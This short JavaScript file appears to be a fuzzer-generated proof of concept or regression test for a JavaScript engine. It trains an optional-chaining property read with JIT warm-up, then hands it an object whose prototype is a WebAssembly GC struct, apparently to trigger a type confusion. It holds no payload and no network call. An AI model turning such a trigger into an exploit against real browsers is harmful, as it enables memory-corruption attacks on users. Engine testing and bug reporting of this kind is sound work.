function vuln(a1) {
    return a1?.p;
}
var proto = { p: 1 };
let v7;
try { v7 = Object.create(proto); } catch (e) {}
var warmup_obj = v7;
for (let i10 = 0; i10 < 20000; i10++) {
    try { vuln(warmup_obj); } catch (e) {}
}
const v69 = [0,97,115,109,1,0,0,0,1,9,2,95,1,127,0,96,0,1,110,127,3,2,1,0,7,14,1,10,103,101,116,95,115,116,114,117,99,116,0,0,10,9,1,7,0,65,42,251,4,0,11];
let v70;
try { v70 = new Uint8Array(v69); } catch (e) {}
var wasmCode = v70;
const v73 = WebAssembly?.Module;
let v74;
try { v74 = new v73(wasmCode); } catch (e) {}
var wasmModule = v74;
const v76 = WebAssembly?.Instance;
const v77 = {};
let v78;
try { v78 = new v76(wasmModule, v77); } catch (e) {}
const v79 = v78?.exports;
let v80;
try { v80 = v79.get_struct(); } catch (e) {}
var wasmStruct = v80;
var victim = {};
try { Object.setPrototypeOf(victim, wasmStruct); } catch (e) {}
try { vuln(victim); } catch (e) {}
